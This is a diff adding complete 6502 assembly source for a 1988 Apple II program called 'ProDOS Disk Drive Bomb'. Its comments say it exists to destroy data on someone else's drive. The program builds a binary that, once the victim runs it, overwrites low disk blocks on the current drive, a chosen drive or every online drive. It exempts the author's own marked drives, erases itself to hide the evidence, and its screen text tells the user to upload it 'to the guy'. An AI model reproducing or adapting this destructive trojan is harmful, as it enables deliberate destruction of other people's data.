@@ -1,0 +1,297 @@
+         ORG   $2000
+CLS      EQU   $FC58
+DEVCNT   EQU   $BF31
+DEVLST   EQU   $BF32
+GETCHAR  EQU   $FD0C
+*
+*        => PRODOS DISK DRIVE BOMB <=
+*
+*        V1.0 by -DC- on 04/07/88
+*        V1.1 by -DC- on 04/10/88
+*       V1.1a by -DC- on 07/30/88
+*       V1.1b by -DC- on 08/01/88
+*
+* Description:
+*
+*   This program will allow the user to create a binary file
+* that will wipe out blocks 0-xx, ensuring that all data on
+* these blocks are destroyed, and therefore making it impossible
+* to regain access to information on the disk.
+*   The purpose behind the program was to give the user power
+* to destroy data on someone's drive by getting them to execute
+* the binary file.
+*   There is also a protection scheme in this program to prevent
+* the program from destroying my own system.  If the last byte
+* on block $00 is equal to $DC, it will not destroy that drive,
+* and that drive only.
+*
+         JMP   START
+         JMP   BOMB
+START    LDA   #$00
+         STA   $22        ;Same as the TEXT command
+         JSR   CLS        ;Clears the screen
+         JSR   SOUND
+         JSR   SOUND
+         LDX   #$00
+P1       LDA   DATA,X
+         CMP   #$80
+         BEQ   J1
+         INX
+         JSR   $FDED      ;Prints out character in A reg.
+         JMP   P1         ;Goes back to get next character
+J1       LDA   #$05       ;Loads A reg. with 5 to lock out
+         STA   $22        ;the top 5 lines of text.
+         LDX   #$00
+P7       LDA   BLOCKS,X
+         CMP   #$80
+         BEQ   BLOCK2
+         INX
+         JSR   $FDED
+         JMP   P7
+*
+BLOCK    JSR   GETCHAR    ;Get block # input (hex)
+         CMP   #$B0
+         BMI   BLOCK
+         CMP   #$BA
+         BMI   BLOCK1
+         CMP   #$C1
+         BMI   BLOCK      ;Bad input
+         CMP   #$C7
+         BPL   BLOCK      ;Bad input (too high)
+         JSR   $FDED
+         STA   $2000      ;Stores in safe place for later
+         AND   #$0F       ;Strip off upper bits
+         CLC
+         ADC   #$09       ;Change to $A-$F value
+         RTS
+BLOCK1   JSR   $FDED
+         STA   $2000      ;Stores in safe place for later
+         AND   #$0F
+         RTS
+*
+BLOCK2   JSR   BLOCK
+         ASL
+         ASL
+         ASL
+         ASL
+         STA   $1FFF      ;Stores value in empty location
+         LDA   $2000      ;Retrieve original input
+         STA   $0426      ;Prints value in upper right corner
+         JSR   BLOCK      ;Get 2nd input
+         CLC
+         ADC   $1FFF      ;Combine two digits
+         STA   BLMARK
+         LDA   $2000      ;Get original input
+         STA   $0427      ;Print in upper right corner
+         JSR   CLS
+         LDX   #$00
+PRINT    LDA   DATA0,X
+         CMP   #$80
+         BEQ   EOD
+         INX
+         JSR   $FDED
+         JMP   PRINT
+EOD      JSR   GETCHAR    ;Gets target input
+         CMP   #$D0
+         BEQ   PRESET
+         CMP   #$C1
+         BEQ   ALL
+         CMP   #$C3
+         BNE   EOD        ;Go back to input
+         LDA   #$00
+         JMP   END
+ALL      LDA   #$01
+         JMP   END        ;Stores #$01 for device (all)
+PRESET   JSR   CLS        ;Clear screen
+         LDX   #$00
+P2       LDA   DATA1,X    ;Displays "Input slot #" message
+         CMP   #$80
+         BEQ   J2
+         INX
+         JSR   $FDED
+         JMP   P2
+J2       JSR   GETCHAR    ;Gets the slot # input from keyboard
+         CMP   #$B1
+         BMI   J2         ;Slot less than 1?  Yes, go back
+         CMP   #$B8
+         BPL   J2         ;Slot greater than 7?  Yep, go back
+         JSR   $FDED      ;And displays it
+         ASL              ;Shifts bits accordingly
+         ASL
+         ASL
+         ASL
+         STA   $4000      ;Stores input at $4000 (safe location)
+         LDX   #$00
+P3       LDA   DATA2,X    ;Displays "Enter drive #" message
+         CMP   #$80
+         BEQ   J3
+         INX
+         JSR   $FDED
+         JMP   P3
+J3       JSR   GETCHAR    ;Gets drive # input
+         CMP   #$B1
+         BMI   J3         ;Is it drive 0?  Yep, go back
+         CMP   #$B3
+         BPL   J3         ;Is drive greater than 2?  Yep, go back
+         JSR   $FDED      ;And displays it
+         CMP   #$B1       ;Jump over following if
+         BEQ   J4         ;drive # is 1.
+         LDA   $4000      ;Sets up bits correctly so that
+         ORA   #$80       ;the first bit is always 1.
+         STA   $4000
+J4       LDA   $4000
+END      STA   MARKER     ;Stores value at end of program
+         JSR   SOUND
+         JSR   SOUND
+         LDX   #$00
+P4       LDA   DATA3,X
+         CMP   #$80
+         BEQ   J5
+         INX
+         JSR   $FDED
+         JMP   P4
+J5       LDA   #$EA       ;Following will erase first 3 bytes
+         STA   $2000      ;of program so that it'll jump directly
+         STA   $2001      ;to the write routine when executed.
+         STA   $2002
+         RTS              ;End of program
+ERROR2   JMP   $BE0C      ;Jumps to error message routine
+SOUND    LDY   #$FF
+S1       LDA   $C030
+         LDA   #$01
+         JSR   $FCA8
+         LDA   #$03
+         JSR   $FCA8
+         DEY
+         CPY   #$00
+         BNE   S1
+         RTS
+*
+*  The following sets up the data buffer for ProDOS
+*
+BOMB     LDA   MARKER     ;Loads last byte of program (unit #)
+         CMP   #$01
+         BEQ   ALL1       ;Destroy all on-line devices
+         CMP   #$00
+         BNE   GO1        ;Not set for current drive
+         LDA   $BF30      ;Load current drive location
+GO1      STA   $4001      ;Stores slot & drive info (unit #)
+         LDA   #$03       ;Loads parameter count
+         STA   $4000      ;Stores it at first byte
+         LDA   #$00       ;Low byte of data buffer ($5000)
+         STA   $4002      ;Stores it
+         LDA   #$50       ;Hi byte
+         STA   $4003      ;Stores it
+*
+*  The next routine will write through blocks 0-xx
+*
+*  This first part looks at the last byte on block $00
+* to see if it's equal to $DC.  If so, it ignores that drive.
+*
+         LDA   #$00
+         STA   $4004      ;Stores low byte of block ($0)
+         STA   $4005      ;Same as above
+         JSR   $BF00      ;Jumps to MLI routine
+         hex   800040     ;Function code (read), buffer addr.
+         BCS   J6         ;Error occured, go to next step
+         LDA   $51FF      ;Loads last byte of block
+         CMP   #$DC       ;Special code to see if it's protected
+         BEQ   IGNORE     ;Ignore this drive if it's protected
+         LDX   #$FF
+J6       INX              ;Increments to next block
+         STX   $4004      ;Stores low byte of block
+         LDA   #$00
+         STA   $4005      ;Hi byte of block
+         JSR   $BF00      ;Jumps to MLI routine
+         hex   810040     ;Function code, buffer address
+         BCS   ERROR      ;An error has occured
+         CPX   BLMARK     ;Is it the last block yet?
+         BNE   J6         ;Nope, go back and do next one
+         LDA   $1FFF      ;Looks for all drives marker
+         CMP   #$FF
+         BNE   J9
+IGNORE   RTS
+J9       LDX   #$00
+         LDA   #$00       ;The following will wipe out the
+J7       STA   $2000,X    ;program so the victim can't bsave it
+         INX              ;and upload it to someone else.
+         CPX   #$BE       ;Don't erase this stuff, though!
+         BNE   J7
+         JMP   SOUND
+*
+* Destroy All Drives
+*
+ALL1     LDA   #$FF       ;Stores a marker so if error occurs,
+         STA   $1FFF      ;the program won't quit
+ALL2     LDY   $2000
+         CPY   DEVCNT
+         BMI   ALL3       ;All drives not yet destroyed
+         JMP   SOUND      ;All done
+ALL3     LDA   DEVLST,Y   ;Get next drive info
+         JSR   GO1        ;Perform erasure
+         INC   $2000
+         JMP   ALL2       ;Go back for next drive
+*
+*  Subroutines & Data
+*
+*
+ERROR    LDY   $1FFF      ;Checks a marker to see if program is
+         CPY   #$FF       ;supposed to destroy all devices and not
+         BEQ   IGNORE     ;quit on an error
+         TAY              ;Y registor now holds error code
+         LDX   #$00
+P5       LDA   DATA4,X
+         CMP   #$80
+         BEQ   J8
+         INX
+         JSR   $FDED
+         JMP   P5
+J8       TYA
+         JMP   $FDDA      ;Prints error code to screen and ends
+*
+DATA     ASC   "   "
+         HEX   1C202020202020202020202020202020202020202020202020202020
+         HEX   2020202FA4B0AD8D
+         HEX   1C20201C
+         ASC   " ProDOS Disk Drive Bomb V1.1b "
+         HEX   2F202020202F20
+         ASC   " Written by -DC- "
+         HEX   2A         ;Prints an inverse star
+         ASC   " Call Shooting Star "
+         HEX   2020
+         ASC   " 20meg BBS/PAE ProDOS....206/838-7686 "
+         HEX   20
+         INV   "----------------------------------------"
+         HEX   80
+BLOCKS   HEX   8D
+         ASC   "Format blocks $00-$"
+         HEX   80
+DATA0    HEX   8D
+         ASC   "Select a target:"
+         HEX   8D8D
+         ASC   "[C)urrent drive"
+         HEX   8D
+         ASC   "[P)re-set slot/drive"
+         HEX   8D
+         ASC   "[A)ll on-line devices"
+         HEX   8D8D
+         ASC   "Which: "
+         HEX   80
+DATA1    HEX   8D
+         ASC   "Enter slot # to wipe: "
+         HEX   80
+DATA2    HEX   8D
+         ASC   "       Enter drive #: "
+         HEX   80
+DATA3    HEX   8D8D
+         ASC   "       -%> Bomb has been made! <%-"
+         HEX   8D8D
+         ASC   "Type 'BSAVE <filename>,A$2000,L$3C7'"
+         HEX   8D
+         ASC   "And then upload the file to the guy!"
+         HEX   8D8D80
+DATA4    HEX   87
+         ASC   "ProDOS MLI Error $"
+         HEX   80
+BLMARK   HEX   00
+MARKER   HEX   88         ;A data byte marker for slot & drive
